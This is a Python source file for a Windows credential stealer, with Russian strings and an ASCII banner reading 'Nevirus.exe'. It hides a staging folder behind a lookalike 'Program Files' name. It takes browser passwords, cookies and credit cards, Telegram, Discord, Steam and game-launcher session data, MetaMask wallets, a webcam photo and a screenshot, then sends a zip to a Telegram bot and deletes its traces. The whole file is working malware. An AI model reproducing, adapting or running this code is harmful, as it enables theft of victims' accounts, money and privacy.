import telebot
import os
import cv2
import shutil
import configparser
import subprocess
import pyautogui
import sqlite3
import re
from win32crypt import CryptUnprotectData
import win32crypt
import json,base64
from os.path import basename
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import pythoncom
import wmi
import platform
import psutil
import uuid
import socket
import zipfile
import requests
from distutils.dir_util import copy_tree
import tempfile

chat_id = ''#СЮДА CHAT ID
bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА

user = os.getlogin()
dis = r'C:\Program Filеs'
dis2 = 'C:/Program Filеs'
try:
    os.makedirs(dis2)
    subprocess.call(['attrib', '+h', dis2])
except:
    shutil.rmtree(dis2)
cdfilezilla = dis+'\FileZilla.xml'
cdfirefox = dis2+'/browser/Firefox'
cdoperagx = dis2+'/browser/Opera GX'
os.makedirs(dis2+'/browser/Edge')
#telegram
ignore_patterns = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3")
cdtg = os.path.join(dis, 'Telegram')

for path in ['D:\\Telegram Desktop\\tdata',
             os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Telegram Desktop', 'tdata'),
             'C:\\Program Files\\Telegram Desktop\\tdata']:
    try:
        shutil.copytree(path, cdtg, ignore=ignore_patterns)
        break
    except:
        pass
#filezilla
file_path = os.path.join("C:/Users", user, "AppData/Roaming/FileZilla/recentservers.xml")
if os.path.isfile(file_path):
    shutil.copy(file_path, cdfilezilla)
#firefox
mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
if os.path.exists(mozilla_profile_ini):
    os.makedirs(cdfirefox)
try:
    mozilla_profile = os.path.join(os.getenv('APPDATA'), r'Mozilla\Firefox')
    mozilla_profile_ini = os.path.join(mozilla_profile, r'profiles.ini')
    profile = configparser.ConfigParser()
    profile.read(mozilla_profile_ini)
    data_path = os.path.normpath(os.path.join(mozilla_profile, profile.get('Profile0', 'Path')))
    subprocesss = subprocess.Popen("ffpass export -d  " + data_path, shell=True, stdout=subprocess.PIPE)
    subprocess_return = subprocesss.stdout.read()
    passwords = str(subprocess_return)
    with open(dis2+'/browser/Firefox/Saved_Passwords.txt', "a", encoding="utf-8") as file:
        file.write(passwords.replace('\\r', '\n'))
except:
    pass
def get_firefox_cookies():
    try:
        textf = ''
        textf += ''
        profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
        for root, dirs, files in os.walk(profiles_path):
            for name in dirs:
                path = os.path.expanduser("~") + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\"
                profiles = os.listdir(path)
                conn = sqlite3.connect(os.path.join(r"C:\Users\\"+user+"\AppData\Roaming\Mozilla\Firefox\Profiles\\"+profiles[0]+"\cookies.sqlite"))
                cursor = conn.cursor()
                cursor.execute('SELECT host, name, path, value, expiry FROM moz_cookies')
                data = cursor.fetchall()
                for row in data:
                    url, name, path, value, expiry = row
                    textf += f"""{url}	FALSE	{path}	FALSE	{expiry}	{name}	{value}\ns"""
                conn.close()
                break
        return textf
    except:
        pass
try:
    with open(os.path.join(dis2+'/browser/Firefox/Browser_Cookies.txt'), 'w+', encoding='utf-8') as f:
        f.write(get_firefox_cookies())
except:
    pass
    
profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
profiles = os.listdir(profiles_path)
history_data = []

with open(dis2+'/browser/Firefox/Browser_History.txt', 'a', encoding='utf-8') as file:
    try:
        for profile in profiles:
            profile_path = os.path.join(profiles_path, profile)
            places_path = os.path.join(profile_path, "places.sqlite")
            if not os.path.isfile(places_path):
                continue
            conn = sqlite3.connect(places_path)
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_date FROM moz_places')
            data = cursor.fetchall()
            for row in data:
                url, title, time = row
                history_entry = f"URL: {url}\nTitle: {title}\nVisited Time: {time}\n\n"
                history_data.append(history_entry)
                file.write(history_entry.encode('utf-8', 'ignore').decode('utf-8'))
            conn.close()
    except:
        pass
#webcam
with tempfile.TemporaryDirectory() as temp_dir:
    try:
        temp_file = os.path.join(temp_dir, 'webcam.png')
        cap = cv2.VideoCapture(0)
        for i in range(1):
            cap.read()
        ret, frame = cap.read()
        cv2.imwrite(temp_file, frame)
        cap.release()
        shutil.move(temp_file, os.path.join(dis, 'webcam.png'))
    except:
        pass
#screen
try:
    filename = os.path.join(dis2, 'screenshot.png')
    with pyautogui.screenshot() as screenshot:
        screenshot.save(filename)
except:
    pass
#epicgames
epic_games_config_path = os.path.join(os.environ['LOCALAPPDATA'], 'EpicGamesLauncher', 'Saved', 'Config')
destination_path = os.path.join(dis2, 'Games Launcher', 'Epic Games', 'Config')
try:
    shutil.copytree(epic_games_config_path, destination_path)
except:
    pass
#roblox
roblox_local_storage_path = os.path.join(os.environ['LOCALAPPDATA'], 'Roblox', 'LocalStorage')
destination_path = os.path.join(dis2, 'Games Launcher', 'Roblox', 'LocalStorage')

try:
    shutil.copytree(roblox_local_storage_path, destination_path)
except:
    pass
#steam
steam_path = os.environ['ProgramFiles'] + '\\Steam'
steam_config_path = steam_path + '\\config'
steam_x86_path = os.environ['ProgramFiles(x86)'] + '\\Steam'
steam_x86_config_path = steam_x86_path + '\\config'
destination_path = os.path.join(dis, 'Games Launcher', 'Steam', 'config')
destination_path2 = os.path.join(dis, 'Games Launcher', 'Steam')

try:
    files2 = [i for i in os.listdir(steam_path) if os.path.isfile(os.path.join(steam_path, i)) and 'ssfn' in i]
    shutil.copytree(steam_config_path, destination_path)
    shutil.copy(os.path.join(steam_path, files2[0]), destination_path2)
    shutil.copy(os.path.join(steam_path, files2[1]), destination_path2)
except:
    pass

try:
    files3 = [i for i in os.listdir(steam_x86_path) if os.path.isfile(os.path.join(steam_x86_path, i)) and 'ssfn' in i]
    shutil.copytree(steam_x86_config_path, destination_path)
    shutil.copy(os.path.join(steam_x86_path, files3[0]), destination_path2)
    shutil.copy(os.path.join(steam_x86_path, files3[1]), destination_path2)
except:
    pass
#mincraft
file_path = r"C:\Users\\"+user+"\AppData\Roaming\.minecraft\launcher_accounts.json"
if os.path.exists(file_path):
    os.makedirs(dis2+'/Games Launcher/.mincraft')
    try:
        source_folder = r"C:\Users\\"+user+"\AppData\Roaming\.minecraft"
        destination_folder = dis2+'/Games Launcher/.mincraft'
        blacklist = ["TLauncher.exe", "KLauncher.exe", "Old-TLauncher.exe"]
        files = os.listdir(source_folder)
        for file_name in files:
            if file_name in blacklist:
                continue
            file_path = os.path.join(source_folder, file_name)
            if os.path.isfile(file_path):
                destination_file = os.path.join(destination_folder, file_name)
                shutil.copy2(file_path, destination_file)
    except:
        pass
accounts = []
try:
    def getUser():
        return os.path.split(os.path.expanduser('~'))[-1]

    def writeToFile(account):
        with open( dis+'\Games Launcher\mincraft_info.txt', 'a') as file:
            if '@' in account[2]:
                name = 'Email Address'
            else:
                name = 'Xbox Username'

            file.write(f'{name}: {account[2]}\n')
            file.write(f'Username: {account[0]}\n')
            file.write(f'Session Type: {account[1]}\n')
            file.write(f'Session Authorization: {account[3]}\n\n')

    def getLocations():
        if os.name == 'nt':
            locations = [
                f'{os.getenv("APPDATA")}\\.minecraft\\launcher_accounts.json',
                f'{os.getenv("APPDATA")}\\Local\Packages\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\LocalState\\games\\com.mojang\\'
            ]
            return locations
        else:
            locations = [
                f'\\home\\{getUser()}\\.minecraft\\launcher_accounts.json',
                f'\\sdcard\\games\\com.mojang\\',
                f'\\~\\Library\\Application Support\\minecraft'
                f'Apps\\com.mojang.minecraftpe\\Documents\\games\\com.mojang\\'
            ]
            return locations

    def main():
        for location in getLocations():
            if os.path.exists(location):
                auth_db = json.loads(open(location).read())['accounts']

                for d in auth_db:
                    sessionKey = auth_db[d].get('accessToken')
                    username = auth_db[d].get('minecraftProfile')['name']
                    sessionType = auth_db[d].get('type')
                    email = auth_db[d].get('username')
                    if sessionKey != None or '':
                        accounts.append([username, sessionType, email, sessionKey])

        for account in accounts:
            writeToFile(account)

    if __name__ == '__main__':
        main()
except:
    pass
#browser
appdata = os.getenv('LOCALAPPDATA')
browsers = {
    dis2+'/browser/Amigo': appdata + '\\Amigo\\User Data',
    dis2+'/browser/Torch': appdata + '\\Torch\\User Data',
    dis2+'/browser/Kometa': appdata + '\\Kometa\\User Data',
    dis2+'/browser/Orbitum': appdata + '\\Orbitum\\User Data',
    dis2+'/browser/Cent-browser': appdata + '\\CentBrowser\\User Data',
    dis2+'/browser/7star': appdata + '\\7Star\\7Star\\User Data',
    dis2+'/browser/Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    dis2+'/browser/Vivaldi': appdata + '\\Vivaldi\\User Data',
    dis2+'/browser/Chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    dis2+'/browser/Chrome': appdata + '\\Google\\Chrome\\User Data',
    dis2+'/browser/Epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    dis2+'/browser/Edge': appdata + '\\Microsoft\\Edge\\User Data',
    dis2+'/browser/Uran': appdata + '\\uCozMedia\\Uran\\User Data',
    dis2+'/browser/Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    dis2+'/browser/Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    dis2+'/browser/Iridium': appdata + '\\Iridium\\User Data',
    dis2+'/browser/Opera': r'C:\\Users\\'+user+'\\AppData\\Roaming\\Opera Software',
    dis2+'/browser/Opera GX': r'C:\Users\2foll\AppData\Roaming\Opera Software',
}


def get_master_key(path: str):
    try:
        try:
            if not os.path.exists(path):
                return

            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            if not os.path.exists(path):
                return

            with open(path + "\\Opera Stable\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)

            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        pass

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass
    except:
        pass

def save_results(browser_name, data_type, content):
    try:
        if not os.path.exists(browser_name):
            os.mkdir(browser_name)
        if content is not None:
            with open(f'{browser_name}/{data_type}.txt', 'w', encoding='utf-8') as f:
                f.write(content)
    except:
        pass

def get_login_data(path: str, profile: str, master_key):
    try:
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return
        result = ""
        shutil.copy(login_db, 'login_db')
        conn = sqlite3.connect('login_db')
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = decrypt_password(row[2], master_key)
            result += f"""
            URL: {row[0]}
            UserName: {row[1]}
            Password: {password}

            """
        conn.close()
        os.remove('login_db')
        return result
    except:
        pass


def get_credit_cards(path: str, profile: str, master_key):
    try:
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, 'cards_db')
        conn = sqlite3.connect('cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = decrypt_password(row[3], master_key)
            result += f"""
            Name On Card: {row[0]}
            Card Number: {card_number}
            Expires On:  {row[1]} / {row[2]}
            Added On: {datetime.fromtimestamp(row[4])}

            """

        conn.close()
        os.remove('cards_db')
        return result
    except:
        pass

def get_cookies(path: str, profile: str, master_key):
    try:
        cookie_db = f'{path}/{profile}/Network/Cookies'
        if not os.path.exists(cookie_db):
            return
        result = ""
        shutil.copy(cookie_db, 'cookie_db')
        conn = sqlite3.connect('cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = decrypt_password(row[3], master_key)

            result += f"""{row[0]}	FALSE	{row[2]}	FALSE	{row[4]}	{row[1]}	{cookie}
"""

        conn.close()
        os.remove('cookie_db')
        return result
    except:
        pass


def get_web_history(path: str, profile: str):
    try:
        web_history_db = f'{path}\\{profile}\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, 'web_history_db')
        conn = sqlite3.connect('web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
            URL: {row[0]}
            Title: {row[1]}
            Visited Time: {row[2]}

            """
        conn.close()
        os.remove('web_history_db')
        return result
    except:
        pass
def installed_browsers():
    try:
        results = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results
    except:
        pass

if __name__ == '__main__':
    available_browsers = installed_browsers()

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Opera Stable", master_key))
        save_results(browser, 'Browser_History', get_web_history(browser_path, "Opera Stable"))
        save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Opera Stable", master_key))
        save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Opera Stable", master_key))
        save_results(dis2+'/browser/Opera GX', 'Saved_Credit_Cards', get_credit_cards(browser_path, "Opera GX Stable", master_key))
        save_results(dis2+'/browser/Opera GX', 'Saved_Passwords', get_login_data(browser_path, "Opera GX Stable", master_key))
        save_results(dis2+'/browser/Opera GX', 'Browser_History', get_web_history(browser_path, "Opera GX Stable"))
        save_results(dis2+'/browser/Opera GX', 'Browser_Cookies', get_cookies(browser_path, "Opera GX Stable", master_key))
try:        
    os.remove(dis2+'/browser/Opera GX/Saved_Passwords.txt')

    def get_master_key():
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]  
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\\Opera Software\Opera GX Stable\Login Data'
    shutil.copy2(login_db, os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db') 
    conn = sqlite3.connect(os.environ['USERPROFILE'] + '\\AppData\\Roaming\\LoginvaultOPERA.db')
    cursor = conn.cursor()

    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for r in cursor.fetchall():
        url = r[0]

        username = r[1]
        encrypted_password = r[2]
        decrypted_password = decrypt_password(encrypted_password, master_key)

        alldatapass = "\nURL: " + url + "\nUserName: " + username + "\nPassword: " + decrypted_password + "\n"

        with open(cdoperagx+'\Saved_Passwords.txt', "a") as o:
            o.write(alldatapass)
    conn.close()
    os.remove(r"C:/Users//"+user+"/AppData/Roaming/LoginvaultOPERA.db")
except:
    pass
#txt
with open(dis+'\pc-info.txt', 'w', encoding='utf-8') as f:
    try:
        f.write("███╗░░██╗███████╗██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗░░░███████╗██╗░░██╗███████╗\n"
                "████╗░██║██╔════╝██║░░░██║██║██╔══██╗██║░░░██║██╔════╝░░░██╔════╝╚██╗██╔╝██╔════╝\n"
                "██╔██╗██║█████╗░░╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░░░░█████╗░░░╚███╔╝░█████╗░░\n"
                "██║╚████║██╔══╝░░░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗░░░██╔══╝░░░██╔██╗░██╔══╝░░\n"
                "██║░╚███║███████╗░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝██╗███████╗██╔╝╚██╗███████╗\n"
                "╚═╝░░╚══╝╚══════╝░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝\n"
                "------------------------\n")
    except:
        pass
    try:
        pythoncom.CoInitialize()
        user = os.getlogin()
        model_name = wmi.WMI().Win32_Processor()[0].Name
        system_info = platform.uname()
        c = wmi.WMI()
        gpu_info = c.Win32_VideoController()[0]
        ram_info = psutil.virtual_memory()
        disk_info = psutil.disk_partitions()
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                                for ele in range(0,8*6,8)][::-1])
        hostname = socket.gethostname()
        ip_address = requests.get('https://api.ipify.org').text
        url = f"https://ipinfo.io/{ip_address}/json"
        response = requests.get(url)
        data = json.loads(response.text)
        def format_size(size):
            return round(size / (1024 ** 3), 2)
        if "Windows" in system_info.system:
            if "6.1" in platform.win32_ver()[0]:
                os_version = "Windows 7"
            elif "10.0.22000" in platform.win32_ver()[1] or "post-10.0.22000" in platform.win32_ver()[1]:
                os_version = "Windows 11"
            else:
                os_version = "Windows 10"
        else:
            os_version = system_info.system
        cpu_percent = psutil.cpu_percent(interval=1)
        pc_info = "Операционная система: "+os_version+"\nИмя узла: "+system_info.node+"\nИмя пользователя: "+user+"\nАрхитектура: "+system_info.machine+"\nПроцессор: "+model_name+"\nЗагрузка процессора: "+str(cpu_percent)+"%\nВидеокарта: "+gpu_info.Name+"\nMAC-адрес: "+mac_address+"\nIP-адрес: "+ip_address+"\nГород: "+data['city']+"\nСтрана: "+data['country']+"\nОЗУ всего: "+str(format_size(ram_info.total))+" ГБ\nОЗУ свободно: "+str(format_size(ram_info.available))+" ГБ\nОЗУ используется: "+str(format_size(ram_info.used))+" ГБ"
        f.write(pc_info)
        Antiviruses = {
        'C:\\Program Files\\Windows Defender': 'Windows Defender',
        'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
        'C:\\Program Files\\AVG\\Antivirus': 'AVG',
        'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
        'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
        'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
        'C:\\Program Files\\DrWeb': 'Dr.Web',
        'C:\\Program Files\\ESET\\ESET Security': 'ESET',
        'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
        'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
        'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
        }
        Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
        AntivirusesAll = json.dumps(Antivirus)
        f.write("\nАнтивирусы: "+AntivirusesAll+"\n------------------------")
        all_disks = psutil.disk_partitions()
        for disk in all_disks:
            f.write(f"\nДиск: {disk.device}\nТочка монтирования: {disk.mountpoint}\nФайловая система: {disk.fstype}\nВсего места: {psutil.disk_usage(disk.mountpoint).total / (1024 ** 3):.2f} Гб\nИспользовано: {psutil.disk_usage(disk.mountpoint).used / (1024 ** 3):.2f} Гб\nСвободно: {psutil.disk_usage(disk.mountpoint).free / (1024 ** 3):.2f} Гб\n------------------------\n")
        f.write(f"by corpon")
    except:
        pass
#discord
tokens = []
local = os.getenv("localAPPDATA")
roaming = os.getenv("APPDATA")
try:
    paths = {
        "Discord": os.path.join(roaming, "Discord"),
        "Discord Canary": os.path.join(roaming, "discordcanary"),
        "Discord PTB": os.path.join(roaming, "discordptb"),
        "Google Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(roaming, "Opera Software", "Opera Stable"),
        "Brave": os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default"),
        'Lightcord': os.path.join(roaming, "Lightcord"),
        'Opera GX': os.path.join(roaming, "Opera Software", "Opera GX Stable"),
        'Amigo': os.path.join(local, "Amigo", "User Data"),
        'Torch': os.path.join(local, "Torch", "User Data"),
        'Kometa': os.path.join(local, "Kometa", "User Data"),
        'Orbitum': os.path.join(local, "Orbitum", "User Data"),
        'CentBrowser': os.path.join(local, "CentBrowser", "User Data"),
        'Sputnik': os.path.join(local, "Sputnik", "Sputnik", "User Data"),
        'Chrome SxS': os.path.join(local, "Google", "Chrome SxS", "User Data"),
        'Epic Privacy Browser': os.path.join(local, "Epic Privacy Browser", "User Data"),
        'Microsoft Edge': os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
        'Uran': os.path.join(local, "uCozMedia", "Uran", "User Data", "Default"),
        'Iridium': os.path.join(local, "Iridium", "User Data", "Default", "local Storage", "leveld"),
        'Firefox': os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
    }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb", ".sqlite")):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file:
                            for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]:
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(f"{token} | {platform}")

    with open(dis2 + "/discord-token.txt", "w") as f:
        f.write("\n".join(tokens))
except:
    pass
#metamask
user = os.path.expanduser("~")
try:
    def make(args, brow, count):
        try:
            if os.path.exists(args):
                shutil.copytree(args, dis+r"\Metamask_"+brow)
        except shutil.Error:
            pass
    meta_paths = [
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm", "Edge"],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Edge"],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Brave"],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "Google"],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn", "OperaGX"]
    ]
    count = 0
    for i in meta_paths:
        make(i[0], brow=i[1], count=count)
        count += 1
except:
    pass
#send
browsers = ['Amigo', 'Torch', 'Kometa', 'Orbitum', 'Cent-browser', '7star', 'Sputnik', 'Vivaldi', 'Chrome-sxs', 'Epic-privacy-browser', 'Uran', 'Yandex', 'Brave', 'Iridium', 'Opera', 'Opera GX', 'Firefox', 'Edge', 'Chrome']
word = 'Password'
def count_words_in_file(filename):
    with open(filename, 'r') as file:
        text = file.read()
        count = text.count(word)
    return count
total_count = 0
for br in browsers:
    path = os.path.join(r"C:\Program Filеs\browser\\"+br+"\Saved_Passwords.txt")
    if os.path.exists(path):
        count = count_words_in_file(path)
        total_count += count
word = 'Card Number'
def count_words_in_file(filename):
    with open(filename, 'r') as file:
        text = file.read()
        count = text.count(word)
    return count
total_card = 0
for br in browsers:
    path = os.path.join(r"C:\Program Filеs\browser\\"+br+"\Saved_Credit_Cards.txt")
    if os.path.exists(path):
        count = count_words_in_file(path)
        total_card += count
def count_lines_in_files(files):
    total_num_lines = 0
    for file in files:
        if os.path.isfile(file):
            with open(file, 'r') as f:
                num_lines = sum(1 for line in f)
                total_num_lines += num_lines
    return total_num_lines
total_num_lines = 0
for br in browsers:
    files = r"C:\Program Filеs\browser\\"+br+"\Browser_Cookies.txt"
    num_lines = count_lines_in_files([files])
    total_num_lines += num_lines
namezip = system_info.node+'.zip'        
def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zip_obj:
        for foldername, subfolders, filenames in os.walk(folder_path):
            for filename in filenames:
                file_path = os.path.join(foldername, filename)
                zip_obj.write(file_path, os.path.relpath(file_path, folder_path))
zip_folder(dis, namezip)        
bot.send_document(chat_id, open(namezip, 'rb'), caption="📡IP-адрес: "+ip_address+"\n🏬Город: "+data["city"]+"\n🌎Страна: "+data["country"]+"\n\nИнформация о логе:\n🔑: "+str(total_count)+" 🍪:"+str(total_num_lines)+" 💳: "+str(total_card)+"")


shutil.rmtree(dis2)
os.remove(namezip)
